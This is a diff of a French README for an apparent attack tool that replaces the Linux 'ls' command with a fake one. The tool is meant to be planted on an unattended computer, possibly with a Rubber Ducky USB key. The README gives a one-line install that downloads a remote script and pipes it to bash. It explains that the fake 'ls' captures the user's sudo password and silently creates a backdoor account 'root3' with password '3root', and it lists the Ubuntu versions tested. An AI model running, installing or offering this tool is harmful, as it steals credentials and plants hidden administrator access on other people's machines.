@@ -17,5 +17,8 @@ COMMANDE POUR INSTALLER VIA INTERNET : `wget -qO - script.help.pm/ls.php | bash 
 Remplacement de la commande linux LS pour une élévation de privilège.
 
 Vous avez avec un accès sur une session ROOT mais vous ne connaissez pas le mot de pass pour lancer des commandes utiles ?
-Lancer ce script sur un pc portable (une cle usb ruber ducky peut aider) et la commande LS sera remplacer par une fausse commande LS. À l'exécution de LS, cela demandera le mot de pass sudo de l'utilisateur et créer avec ces droits un nouvel utilisateur nommés "root3" avec le mot de pass "3root"
+Lancer ce script sur un pc (une cle usb ruber ducky peut aider) et la commande LS sera remplacer par une fausse commande LS. À l'exécution de LS, cela demandera le mot de pass sudo de l'utilisateur et créer avec ces droits un nouvel utilisateur nommés "root3" avec le mot de pass "3root"
 la commande LS s'affiche normalement après cela
+
+
+ubuntu 20 ans 22 ok
